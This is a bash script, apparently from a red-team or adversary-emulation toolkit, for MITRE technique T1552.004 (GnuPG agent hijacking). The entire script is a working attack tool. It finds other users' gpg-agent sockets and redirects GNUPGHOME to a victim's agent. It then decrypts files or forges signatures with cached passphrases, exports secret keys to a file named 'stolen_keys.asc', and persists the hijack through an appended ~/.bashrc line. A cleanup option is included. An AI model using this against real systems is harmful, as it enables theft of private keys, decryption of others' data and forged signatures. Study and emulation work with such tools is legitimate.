#!/bin/bash
# T1552.004 — Unsecured Credentials: GnuPG Agent Hijacking
# Abuse cached GPG agent credentials to decrypt/sign without passphrase

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_gpg"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1552.004 — GnuPG Agent Hijacking           ║"
    echo "  ║   Abuse cached credentials for decrypt/sign   ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

find_gpg_agents() {
    echo -e "${CYAN}[*] Enumerating GPG agent sockets...${NC}"
    echo ""

    # Method 1: Common paths
    echo -e "  ${YELLOW}Standard socket locations:${NC}"
    find /run/user/*/gnupg/ -name "S.gpg-agent" 2>/dev/null | while read -r sock; do
        local uid
        uid=$(echo "$sock" | grep -oP '/run/user/\K[0-9]+')
        local user
        user=$(getent passwd "$uid" 2>/dev/null | cut -d: -f1)
        echo -e "    ${GREEN}${sock}${NC} (user: ${user:-uid=$uid})"
    done

    # Method 2: From process environment
    echo ""
    echo -e "  ${YELLOW}From process environments:${NC}"
    for pid in $(pgrep gpg-agent 2>/dev/null); do
        local user sock
        user=$(ps -o user= -p "$pid" 2>/dev/null)
        sock=$(grep -z "GPG_AGENT_INFO" /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | head -1)
        [[ -n "$sock" ]] && echo -e "    ${GREEN}PID ${pid}${NC} (${user}): ${sock}"
    done

    # Method 3: Socket files
    echo ""
    echo -e "  ${YELLOW}All gnupg sockets:${NC}"
    find /tmp /run -name "S.gpg-agent*" 2>/dev/null | while read -r sock; do
        echo -e "    ${GREEN}${sock}${NC}"
    done
}

hijack_gpg_agent() {
    echo -e "${CYAN}[*] Hijacking GPG agent${NC}"
    echo ""

    echo -e "${YELLOW}[*] When gpg-agent has a cached passphrase, anyone who can access"
    echo -e "    the socket can decrypt data or sign without knowing the passphrase.${NC}"
    echo ""

    # Find available sockets
    local SOCKETS=()
    while IFS= read -r sock; do
        SOCKETS+=("$sock")
    done < <(find /run/user/*/gnupg/ -name "S.gpg-agent" 2>/dev/null)

    if [[ ${#SOCKETS[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No GPG agent sockets found${NC}"
        read -p "  Enter socket path manually: " SOCK_PATH
        [[ -z "$SOCK_PATH" ]] && return
        SOCKETS=("$SOCK_PATH")
    else
        echo -e "  Available sockets:"
        for i in "${!SOCKETS[@]}"; do
            echo -e "    ${CYAN}[$((i+1))]${NC} ${SOCKETS[$i]}"
        done
        read -p "  Select socket [1-${#SOCKETS[@]}]: " SEL
        SEL=$((SEL - 1))
        [[ $SEL -lt 0 || $SEL -ge ${#SOCKETS[@]} ]] && { echo -e "${RED}[!] Invalid${NC}"; return; }
    fi

    local TARGET_SOCK="${SOCKETS[$SEL]}"
    local GNUPGHOME
    GNUPGHOME=$(dirname "$TARGET_SOCK")

    echo -e "${CYAN}[*] Using socket: ${TARGET_SOCK}${NC}"
    echo ""

    # Set environment to use victim's agent
    export GPG_AGENT_INFO="${TARGET_SOCK}:0:1"
    export GNUPGHOME="$GNUPGHOME"

    # List available keys
    echo -e "  ${YELLOW}Available private keys (via hijacked agent):${NC}"
    gpg --homedir "$GNUPGHOME" --list-secret-keys --keyid-format short 2>/dev/null

    echo ""
    echo -e "  ${CYAN}[a]${NC} Decrypt a file using cached passphrase"
    echo -e "  ${CYAN}[b]${NC} Sign data using cached passphrase"
    echo -e "  ${CYAN}[c]${NC} Export private key (if agent allows)"
    echo -e "  ${CYAN}[d]${NC} Set up persistent agent forwarding"
    echo ""
    read -p "  Choose [a/b/c/d]: " ACTION

    mkdir -p "$WORKDIR"

    case "$ACTION" in
        a)
            read -p "  File to decrypt: " ENCFILE
            if [[ -f "$ENCFILE" ]]; then
                gpg --homedir "$GNUPGHOME" --batch --yes --decrypt "$ENCFILE" 2>/dev/null
                echo -e "${GREEN}[+] Decryption attempted (check output above)${NC}"
            else
                echo -e "${RED}[!] File not found${NC}"
            fi
            ;;
        b)
            read -p "  File to sign: " SIGNFILE
            if [[ -f "$SIGNFILE" ]]; then
                gpg --homedir "$GNUPGHOME" --batch --yes --detach-sign "$SIGNFILE" 2>/dev/null
                echo -e "${GREEN}[+] Signed: ${SIGNFILE}.sig${NC}"
            else
                echo -e "${RED}[!] File not found${NC}"
            fi
            ;;
        c)
            echo -e "${YELLOW}[*] Attempting key export...${NC}"
            gpg --homedir "$GNUPGHOME" --batch --yes --export-secret-keys --armor 2>/dev/null > "${WORKDIR}/stolen_keys.asc"
            if [[ -s "${WORKDIR}/stolen_keys.asc" ]]; then
                echo -e "${GREEN}[+] Keys exported to: ${WORKDIR}/stolen_keys.asc${NC}"
            else
                echo -e "${RED}[!] Export failed (agent may require confirmation)${NC}"
            fi
            ;;
        d)
            # Create persistent hijack via shell alias
            cat > "${WORKDIR}/gpg_forward.sh" << FEOF
#!/bin/bash
# ${MARKER} — persistent GPG agent forwarding
export GPG_AGENT_INFO="${TARGET_SOCK}:0:1"
export GNUPGHOME="${GNUPGHOME}"
FEOF
            echo "source ${WORKDIR}/gpg_forward.sh" >> ~/.bashrc 2>/dev/null
            echo -e "${GREEN}[+] Persistent agent forwarding added to ~/.bashrc${NC}"
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            ;;
    esac
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up GPG agent hijack...${NC}"

    rm -rf "$WORKDIR"
    sed -i "/${MARKER}/d" ~/.bashrc 2>/dev/null
    unset GPG_AGENT_INFO GNUPGHOME

    echo -e "${GREEN}[+] GPG agent hijack cleaned up${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Find GPG agent sockets"
    echo -e "  ${CYAN}[2]${NC} Hijack GPG agent"
    echo -e "  ${CYAN}[3]${NC} Cleanup"
    echo ""
    read -p "Choose [1-3]: " OPT

    case "$OPT" in
        1) find_gpg_agents ;;
        2) hijack_gpg_agent ;;
        3) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
